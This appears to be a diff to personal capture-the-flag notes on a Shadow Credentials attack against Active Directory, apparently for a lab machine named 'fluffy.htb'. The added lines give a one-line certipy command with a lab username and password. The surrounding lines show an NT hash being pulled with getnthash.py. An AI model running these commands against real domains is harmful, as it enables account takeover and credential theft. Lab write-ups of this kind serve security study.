@@ -4,7 +4,13 @@ Prerequisites
 3. The Domain Controller to use during the attack must have its own certificate and keys (this means either the organization must have AD CS, or a PKI, a CA or something alike).
 4. The attacker must have control over an account able to write the `msDs-KeyCredentialLink` attribute of the target user or computer account.
 
+### do it all in one command with `certipy`
+```bash
+certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc -dc-ip 10.10.11.69
+
+```
 ---
+
 
 basically it allow us to modify the `msDS-KeyCredentialLink` to add shadow credentials
 ```bash
@@ -35,3 +41,5 @@ then last thing to get the NT hash:
 python3 getnthash.py -key 159bb5340c836973dd34c732c9f1efe0e6a98771ef00bdf0918d514b55d405ee fluffy.htb/winrm_svc
 
 ```
+
+
